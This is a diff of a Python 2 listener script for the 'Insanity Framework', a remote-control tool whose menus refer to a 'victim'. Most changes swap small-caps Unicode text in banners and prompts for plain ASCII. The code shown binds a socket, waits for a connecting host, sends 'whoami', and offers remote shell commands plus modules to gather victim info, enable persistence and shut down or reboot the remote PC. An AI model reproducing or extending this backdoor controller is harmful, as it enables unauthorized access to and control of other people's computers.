@@ -41,8 +41,8 @@ def heading():
                  '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO': 
                       `$"  `OOOO' `O"Y ' `OOOO'  o             .
     .                  .     OP"          : o     .
-                              :                  ʙʏ: ''' + WHITE + '''ᴀʟɪssᴏɴ ᴍᴏʀᴇᴛᴛᴏ(''' + RED + '''4ᴡ4ᴋ3''' + WHITE + ''')''' + RED +  '''                                         
- -- [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ  --                            Version: 0.1                
+                              :                  ʙʏ: ''' + WHITE + '''Alisson Moretto(''' + RED + '''4ᴡ4ᴋ3''' + WHITE + ''')''' + RED +  '''                                         
+ -- [I]nsanity [F]ramework  --                            Version: 0.1                
 ''' + END)
 
 
@@ -79,25 +79,23 @@ heading()
 
 
 def mess():
-    print '[*] Oᴘᴇʀᴀᴛɪᴏɴᴀʟ Sʏsᴛᴇᴍ: ' + data2
+    print '[*] O.S.: ' + data2
     if vm == 'True':
-        print '[*] Vɪʀᴛᴜᴀʟ ᴍᴀᴄʜɪɴᴇ: {0}Dᴇᴛᴇᴄᴛᴇᴅ{1}'.format(RED, END) 
+        print '[*] Virtual Machine: {0}Detected{1}'.format(RED, END) 
     else:
-        print '[*] Vɪʀᴛᴜᴀʟ ᴍᴀᴄʜɪɴᴇ: ɴᴏᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ'
-    print '[*] Lᴏᴄᴀʟ ɪᴘ: ' + ip
-#    print '[*] Rᴇᴍᴏᴛᴇ Hᴏsᴛ: ' + oss
-    print '-{0} ᴛʏᴘᴇ ᴀ ʀᴇᴍᴏᴛᴇ sʜᴇʟʟ ᴄᴏᴍᴍᴀɴᴅ{1} - {0}[{1}ᴇx: ɪᴘᴄᴏɴꜰɪɢ{0}]{1}: '.format(BLUE, END)
-    print '- {0}ʀᴜɴ ᴀ ɪɴsᴀɴɪᴛʏ ᴍᴏᴅᴜʟᴇ{1} - {0}[{1}ᴠɪᴇᴡ ᴀᴠᴀɪʟᴀʙʟᴇ ᴍᴏᴅᴜʟᴇs ᴏɴ ʜᴇʟᴘ ᴍᴇssᴀɢᴇ{0}]{1}: '.format(BLUE, END)
-    print '-{0} ʜᴇʟᴘ {1}- {0}[{1}ᴠɪᴇᴡ ʜᴇʟᴘ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴍᴏᴅᴜʟᴇs{0}]{1}: '.format(BLUE, END)
+        print '[*] Virtual Machine: Not Detected'
+    print '-{0} Type a remote shell command{1} - {0}[{1}ex: ipconfig{0}]{1}: '.format(BLUE, END)
+    print '- {0}Run insanity modules{1} - {0}[{1}view available modules on help message{0}]{1}: '.format(BLUE, END)
+    print '-{0} ʜᴇʟᴘ {1}- {0}[{1}View help message and modules{0}]{1}: '.format(BLUE, END)
 
 s = socket(AF_INET, SOCK_STREAM)
-print '[!] Wᴀɪᴛɪɴɢ ꜰᴏʀ ᴄᴏɴɴᴇᴄᴛɪᴏɴs '
+print '[!] Wainting Connections '
 s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 s.bind((HOST, PORT))
-print "[*] Lɪsᴛᴇɴɪɴɢ ᴏɴ: 0.0.0.0:%s" % str(PORT)
+print "[*] Listening on: 0.0.0.0:%s" % str(PORT)
 s.listen(10)
 conn, addr = s.accept()
-print '[*] Cᴏɴɴᴇᴄᴛɪᴏɴ: ' + '{0}ESTABLISHED{2}'.format(GREEN, WHITE, END)
+print '[*] Connection: ' + '{0}ESTABLISHED{2}'.format(GREEN, WHITE, END)
 data = conn.recv(1024) 
 ip = conn.recv(1024)
 conn.send('whoami')
@@ -110,14 +108,14 @@ mess()
 
 def help():
     print '''
-- [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ -
+- [I]nsanity [F]ramework -
     
-ᴛʏᴘᴇ {0}ɪɴꜰᴏ{1} - {0}[{1}sʜᴏᴡ ɪɴꜰᴏ's ᴀʙᴏᴜᴛ ᴠɪᴄᴛɪᴍ{0}]{1}
-ᴛʏᴘᴇ {0}ᴘᴇʀsɪsᴛᴇɴᴄᴇ{1} - {0}[{1}ᴇɴᴀʙʟᴇ ᴘᴇʀsɪsᴛᴇɴᴄᴇ{0}]{1}
-ᴛʏᴘᴇ {0}sʜᴜᴛᴅᴏᴡɴ{1} - {0}[{1}ᴛᴜʀɴ ᴏꜰꜰ ʀᴇᴍᴏᴛᴇ ᴘᴄ{0}]{1}
-ᴛʏᴘᴇ {0}ʀᴇsᴛᴀʀᴛ{1} - {0}[{1}ᴛᴜʀɴ ᴏꜰꜰ & ᴛᴜʀɴ ᴏɴ ʀᴇᴍᴏᴛᴇ ᴘᴄ{0}]{1}
-ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}
-ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}
+ᴛʏᴘᴇ {0}info{1} - {0}[{1}show info about victim{0}]{1}
+ᴛʏᴘᴇ {0}persistence{1} - {0}[{1}enable persistence{0}]{1}
+ᴛʏᴘᴇ {0}shutdown{1} - {0}[{1}turn off remote pc{0}]{1}
+ᴛʏᴘᴇ {0}restart{1} - {0}[{1}reboot remote pc{0}]{1}
+ᴛʏᴘᴇ {0}back{1} - {0}[{1}return to main menu{0}]{1}
+ᴛʏᴘᴇ {0}quit{1} - {0}[{1}tool exit{0}]{1}
 '''.format(BLUE, END)
 
 
@@ -141,10 +139,10 @@ def main():
             elif command.upper() == 'PERSISTENCE':
                 try:
                     conn.send('persistence')
-                    print '[*] Pᴇʀsɪsᴛᴇɴᴄᴇ Mᴏᴅᴜʟᴇ Eɴᴀʙʟᴇᴅ'
+                    print '[*] Persistence module enabled'
                 except:
                     print '\n'
-                    print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
+                    print '{0}Remote host are disconnected{1} '.format(RED, END)
                     print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                     print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)
             elif command.upper() == 'SHUTDOWN':
